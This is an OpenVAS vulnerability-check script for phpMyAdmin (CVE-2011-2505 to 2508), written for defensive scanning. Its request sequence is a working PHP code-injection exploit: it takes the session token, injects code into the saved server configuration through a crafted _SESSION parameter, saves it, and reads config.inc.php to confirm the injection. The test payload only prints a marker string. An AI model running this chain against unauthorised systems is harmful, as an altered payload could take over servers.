###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_phpmyadmin_48563.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# phpMyAdmin Prior to 3.3.10.2 and 3.4.3.1 Multiple Remote Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################
CPE = "cpe:/a:phpmyadmin:phpmyadmin";


if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103188");
  script_version("$Revision: 11997 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-07-11 14:09:04 +0200 (Mon, 11 Jul 2011)");
  script_bugtraq_id(48563);
  script_cve_id("CVE-2011-2505", "CVE-2011-2506", "CVE-2011-2507", "CVE-2011-2508");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_name("phpMyAdmin Prior to 3.3.10.2 and 3.4.3.1 Multiple Remote Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/48563");
  script_xref(name:"URL", value:"http://ha.xxor.se/2011/07/phpmyadmin-3x-multiple-remote-code.html");
  script_xref(name:"URL", value:"http://www.phpmyadmin.net/home_page/index.php");
  script_xref(name:"URL", value:"http://www.phpmyadmin.net/home_page/security/PMASA-2011-5.php");
  script_xref(name:"URL", value:"http://www.phpmyadmin.net/home_page/security/PMASA-2011-6.php");
  script_xref(name:"URL", value:"http://www.phpmyadmin.net/home_page/security/PMASA-2011-7.php");
  script_xref(name:"URL", value:"http://www.phpmyadmin.net/home_page/security/PMASA-2011-8.php");
  script_xref(name:"URL", value:"http://typo3.org/teams/security/security-bulletins/typo3-sa-2011-008/");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("secpod_phpmyadmin_detect_900129.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("phpMyAdmin/installed");
  script_tag(name:"solution", value:"Updates are available. Please see the references for more information.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"phpMyAdmin is prone to multiple remote vulnerabilities, including PHP
code-execution and local file-include vulnerabilities.

Successful attacks can compromise the affected application and
possibly the underlying computer.

phpMyAdmin versions prior to 3.3.10.2 and 3.4.3.1 are vulnerable.");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))exit(0);
if( ! dir = get_app_location(cpe:CPE, port:port))exit(0);

url = string(dir, "/setup/index.php");
req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if(buf =~ "HTTP/1.. 404" || "Cannot load or save configuration" >< buf)exit(0);

c = eregmatch(pattern:"phpMyAdmin=([^;]+)", string:buf);
if(isnull(c[1]))exit(0);
cookie = c[1];

t = eregmatch(pattern:'(token=|token" value=")([0-9a-f]{32})', string:buf);
if(isnull(t[2]))exit(0);
token = t[2];

req = string("GET ",dir,"/?_SESSION[ConfigFile][Servers][*/print+%22openvas-c-i-test%22%3B/*][port]=0&session_to_unset=x&token=",token," HTTP/1.1\r\n",
	     "Host: ",get_host_name(),"\r\n",
	     "Accept: */*\r\n",
	     "Cookie: phpMyAdmin=",cookie,"\r\n",
	     "\r\n");

rcv = http_send_recv(port:port, data:req);

if(rcv !~ "HTTP/1.. 200 OK")exit(0);

req = string("POST ",dir,"/setup/config.php HTTP/1.1\r\n",
	     "Host: ",get_host_name(),"\r\n",
	     "Accept: */*\r\n",
	     "Cookie: phpMyAdmin=",cookie,"\r\n",
	     "Content-Length: 55\r\n",
	     "Content-Type: application/x-www-form-urlencoded\r\n",
	     "\r\n",
	     "submit_save=Save&token=",token,"\r\n");

rcv = http_send_recv(port:port, data:req);

url = string(dir, "/config/config.inc.php");
req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if("openvas-c-i-test" >< buf) {
  security_message(port:port);
  exit(0);
}


